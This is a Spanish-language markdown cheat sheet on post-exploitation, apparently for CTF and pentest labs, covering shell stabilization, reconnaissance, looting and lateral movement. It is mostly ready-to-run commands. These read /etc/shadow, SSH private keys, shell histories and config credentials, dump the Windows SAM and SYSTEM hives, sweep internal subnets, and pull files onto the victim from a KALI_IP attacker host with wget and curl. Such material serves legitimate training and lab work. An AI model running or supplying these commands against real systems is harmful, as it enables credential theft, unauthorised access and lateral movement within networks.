# Post-Explotación

## Descripción

Qué hacer nada más obtener una shell. El orden importa: primero estabiliza, luego reconoce, luego escala.

---

## Paso 1 — Estabiliza la shell

Las shells obtenidas via exploits suelen ser inestables. Conviértela en una TTY interactiva:

```shell
# Python (el más fiable)
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Script
script /dev/null -c bash

# Perl
perl -e 'exec "/bin/bash";'
```

Para tener autocompletado y atajos de teclado (Ctrl+C, etc.):

```shell
# Tras obtener la TTY con python pty:
# 1. Ctrl+Z para poner la shell en background
# 2. En Kali:
stty raw -echo; fg
# 3. En la shell:
export TERM=xterm
```

---

## Paso 2 — Reconocimiento básico

Ejecuta siempre esto nada más entrar:

```shell
whoami && id                    # Quién soy
hostname                        # Nombre de la máquina
uname -a                        # Kernel y arquitectura (Linux)
cat /etc/os-release             # Distribución
ip a || ifconfig                # Interfaces de red
cat /etc/hosts                  # Otros hosts conocidos
env                             # Variables de entorno
```

---

## Paso 3 — Escala privilegios

Si no eres root/SYSTEM, ve a la metodología correspondiente:

- Linux → **Escalada-Privilegios-Linux.md**
- Windows → **Escalada-Privilegios-Windows.md**

---

## Paso 4 — Pillaje (una vez eres root)

### Linux

```shell
# Hashes de contraseñas
cat /etc/shadow

# Historial de comandos de todos los usuarios
cat /root/.bash_history
cat /home/*/.bash_history

# Claves SSH privadas
find / -name "id_rsa" 2>/dev/null
cat /root/.ssh/id_rsa

# Flags (en máquinas CTF)
find / -name "*.txt" 2>/dev/null | xargs grep -l "flag\|FLAG\|root" 2>/dev/null
cat /root/root.txt
cat /home/*/user.txt

# Archivos de configuración con credenciales
find / -name "*.conf" -o -name "*.config" -o -name "wp-config.php" 2>/dev/null
```

### Windows

```shell
# Flags CTF
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\*\Desktop\user.txt

# SAM y SYSTEM (hashes de contraseñas locales)
reg save HKLM\SAM C:\sam
reg save HKLM\SYSTEM C:\system
# Transferir a Kali y extraer con secretsdump.py

# Historial de PowerShell
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

## Paso 5 — Movimiento lateral (si hay red interna)

Si en `/etc/hosts` o en la interfaz de red hay más hosts:

```shell
# Escaneo de red interna desde la víctima
for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i está vivo"; done

# O con nmap si está disponible
nmap -sn 192.168.1.0/24
```

Si necesitas acceder a servicios internos desde Kali, haz port forwarding:

```shell
# SSH port forwarding (si tienes credenciales SSH)
ssh -L 8080:127.0.0.1:8080 usuario@TARGET_IP
```

---

## Transferencia de archivos

Ver **Transferencia-Archivos.md** para métodos detallados.

Método más rápido (servidor HTTP en Kali):

```shell
# En Kali
cd /directorio/con/archivos
python3 -m http.server 8080

# En la víctima
wget http://KALI_IP:8080/archivo
curl http://KALI_IP:8080/archivo -o archivo
```

---

## Checklist rápido

```
[ ] Estabilizar shell con python pty
[ ] whoami / id / uname -a / hostname
[ ] Ver interfaces de red y /etc/hosts
[ ] Escalar privilegios
[ ] cat /etc/shadow (Linux) o volcar SAM (Windows)
[ ] Buscar flags si es CTF
[ ] Buscar credenciales en archivos de configuración
[ ] Buscar claves SSH privadas
[ ] Explorar historial de comandos
[ ] ¿Hay más hosts en la red?
```
